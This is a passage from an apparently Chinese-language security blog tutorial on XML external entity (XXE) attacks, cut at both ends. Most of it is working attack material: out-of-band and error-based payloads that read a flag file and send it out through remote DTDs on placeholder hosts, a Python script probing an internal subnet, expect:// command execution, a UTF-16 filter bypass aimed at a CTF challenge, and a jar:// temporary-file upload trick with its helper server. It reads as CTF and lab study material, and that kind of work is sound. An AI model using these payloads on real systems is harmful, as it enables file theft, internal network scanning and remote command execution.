class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamso</span> <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;send;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">    &#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>1234<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="基于报错的XXE-Error-Based-XXE"><a href="#基于报错的XXE-Error-Based-XXE" class="headerlink" title="基于报错的XXE(Error Based XXE)"></a>基于报错的XXE(Error Based XXE)</h2><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p><p>出网payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;https://vps/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">    %error;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; error SYSTEM &#x27;file:///fakefile/%file;&#x27;&gt;&quot;</span>&gt;</span><br>%start;<br></code></pre></td></tr></table></figure><p>不出网如果可以写文件的话就可以构造本地恶意dtd</p><p>不出网payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///tmp/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&#x27;aaa)&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;error;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %local_dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>flag<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&quot;and | or | not | equal | contains | exists | subdomain-of&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">pattern</span> (%<span class="hljs-keyword">condition</span>;)&gt;</span><br></code></pre></td></tr></table></figure><h2 id="探测内网主机与端口"><a href="#探测内网主机与端口" class="headerlink" title="探测内网主机与端口"></a>探测内网主机与端口</h2><p>利用http协议和网页响应时间来判断主机存活</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">XXE</span>(<span class="hljs-params">ip,string</span>):<br>    <span class="hljs-keyword">try</span>:<br>        xml = <span class="hljs-string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + string + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br>        x = requests.post(<span class="hljs-string">&#x27;http://192.168.91.134/xml.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="hljs-number">5</span>).text<br>        coded_string = x.split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">2</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [+]&#x27;</span>,ip,<span class="hljs-string">&#x27;Successfully Found !!!&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [-]&#x27;</span>,ip,<span class="hljs-string">&#x27;Error Not Found !!!&#x27;</span>)<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/xml&#x27;</span>&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">130</span>,<span class="hljs-number">150</span>):<br>        ip = <span class="hljs-string">&#x27;192.168.91.&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>        string = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/&#x27;</span><br>        XXE(ip,string)<br></code></pre></td></tr></table></figure><p>根据返回内容的不同来判断端口是否开启</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.91.149:80&quot;</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">xxe</span> (<span class="hljs-keyword">#PCDATA</span>) &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xxe</span>&gt;</span>666<span class="hljs-tag">&lt;/<span class="hljs-name">xxe</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><p>在安装<code>expect</code>扩展的<code>PHP</code>环境里执行系统命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">name</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用<code>utf-16</code>编码绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://9b6b0b8a-f306-4372-9f2c-60abfae7b4d4.challenge.ctf.show/&#x27;</span><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;!DOCTYPE convert [</span><br><span class="hljs-string">&lt;!ENTITY % remote SYSTEM &quot;http://vps/evil.dtd&quot;&gt;</span><br><span class="hljs-string">%remote;%int;%send;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br>rep = requests.post(url=url, data=payload)<br><span class="hljs-built_in">print</span>(rep.text)<br></code></pre></td></tr></table></figure><p>或者命令转换编码<code>iconv -f utf8 -t UTF-32LE  1.xml &gt; 2.xml</code>，<code>echo urlencode(file_get_contents(&quot;payload.xml&quot;));</code>读</p><h2 id="jar-x2F-x2F-文件上传"><a href="#jar-x2F-x2F-文件上传" class="headerlink" title="jar:&#x2F;&#x2F; 文件上传"></a>jar:&#x2F;&#x2F; 文件上传</h2><p><code>Java</code>环境下还可以利用<code>jar</code>协议上传文件</p><p><code>jar</code>协议语法，<code>jar:&#123;url&#125;!/&#123;entry&#125;</code>，<code>url</code>是文件的路径，<code>entry</code>是想要解压出来的文件</p><p>jar 协议处理文件的过程：<br>1：下载 jar&#x2F;zip 文件到临时文件中<br>2：提取出我们指定的文件<br>3：删除临时文件</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY  <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;jar:http://ip:port/1.zip!/1.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当<code>1.zip</code>中没有<code>1.php</code>时，<code>java</code>解析器就会报错，说在这个临时文件中找不到这个文件，这样就得到了临时文件的路径，可以利用文件包含等漏洞去进一步利用这个文件，其原理类似于<code>php</code>的<code>phpinfo</code>临时文件包含</p><p>本地搭建一个环境测试：</p><p>main.java，部署在tomcat上，模拟一个存在xxe漏洞的网页</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.w3c.dom.Element;<br><span class="hljs-keyword">import</span> org.w3c.dom.Node;<br><span class="hljs-keyword">import</span> org.w3c.dom.NodeList;<br><span class="hljs-keyword">import</span> org.xml.sax.InputSource;<br><span class="hljs-keyword">import</span> org.w3c.dom.Document;<br><span class="hljs-keyword">import</span> org.xml.sax.SAXException;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilder;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;<br><span class="hljs-keyword">import</span> javax.xml.parsers.ParserConfigurationException;<br><br><span class="hljs-meta">@WebServlet(&quot;/xxe&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">main</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">parmeter</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;poc&quot;</span>);<br><br>        <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>        <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            db = dbf.newDocumentBuilder();<br>        &#125; <span class="hljs-keyword">catch</span> (ParserConfigurationException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-type">StringReader</span> <span class="hljs-variable">sr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(parmeter);<br>        <span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(sr);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-type">Element</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> document.getDocumentElement();<br>            <span class="hljs-type">NodeList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> element.getChildNodes();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">iloop</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; iloop &lt; list.getLength(); iloop++) &#123;<br>                <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> list.item(iloop);<br>                <span class="hljs-keyword">if</span> (node.getNodeType() == Node.ELEMENT_NODE) &#123;<br>                    writer.write(node.getNodeName() + <span class="hljs-string">&quot;：&quot;</span><br>                            + node.getTextContent());<br>                &#125;<br>            &#125;<br>            writer.close();<br>        &#125; <span class="hljs-keyword">catch</span> (SAXException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-5.png"></p><p>再用python起个http服务，进行监听</p><p>xxe-jar.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-keyword">import</span> http.client <span class="hljs-keyword">as</span> httpc<br><br>listen_host = <span class="hljs-string">&#x27;localhost&#x27;</span><br>listen_port = <span class="hljs-number">9999</span><br>jar_file = sys.argv[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JarRequestHandler</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        http_req = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;New connection:&#x27;</span>,self.client_address)<br>        <span class="hljs-keyword">while</span> <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> http_req:<br>            <span class="hljs-keyword">try</span>:<br>                http_req += self.request.recv(<span class="hljs-number">4096</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Client req:\r\n&#x27;</span>,http_req.decode())<br>                jf = <span class="hljs-built_in">open</span>(jar_file, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>                contents = jf.read()<br>                headers = (<span class="hljs-string">&#x27;&#x27;&#x27;HTTP/1.0 200 OK\r\n&#x27;&#x27;&#x27;</span><br>                <span class="hljs-string">&#x27;&#x27;&#x27;Content-Type: application/java-archive\r\n\r\n&#x27;&#x27;&#x27;</span>)<br>                self.request.sendall(headers.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>                self.request.sendall(contents[:-<span class="hljs-number">1</span>])<br>                time.sleep(<span class="hljs-number">30</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-number">30</span>)<br>                self.request.sendall(contents[-<span class="hljs-number">1</span>:])<br><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;get error at:&quot;</span>+<span class="hljs-built_in">str</span>(e))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler)<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;waiting for connection...&#x27;</span>)<br>    server_thread = threading.Thread(target=jarserver.serve_forever)<br>    server_thread.daemon = <span class="hljs-literal">True</span><br>    server_thread.start()<br>    server_thread.join()<br></code></pre></td></tr></table></figure><p>执行<code>python xxe-jar.py evil.zip</code></p><p><code>evil.zip</code>就是要上传的文件了，不一定要是<code>zip</code>，但是因为<code>jar</code>协议会对文件进行解包操作，如果不上传<code>zip</code>格式文件在报错里是看不到临时文件路径的，所以需要先正常上传一次<code>zip</code>格式文件获取路径然后再上传其他文件</p><p>访问<code>/xxe</code>，<code>post</code>发<code>payload</code></p><p>获取路径<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-7.png"></p><p>上传文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-8.png"></p><p>监听情况，<code>30</code>是延时了<code>30</code>秒<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-6.png"></p><p>至于为什么要延迟，回到<code>jar</code>协议处理文件的过程，因为最后一步会删除临时文件，所以我们就要考虑如何让这个文件能更长时间的停留在我们的系统之中，解决方法是在文件结尾添加一个垃圾字符，然后发送除了最后一个字节的所有数据后进行<code>sleep</code>，这样实际上已经传完了，但是服务器以为没传完，就暂时不会删除临时文件了</p><h2 id="netdoc-协议"><a href="#netdoc-协议" class="headerlink" title="netdoc 协议"></a>netdoc 协议</h2><p><code>Java</code>中<code>netdoc</code>协议可以替代<code>file</code>协议功能，读文件，同时也可以列目录</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">creds</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;netdoc:///c:/windows/system.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span 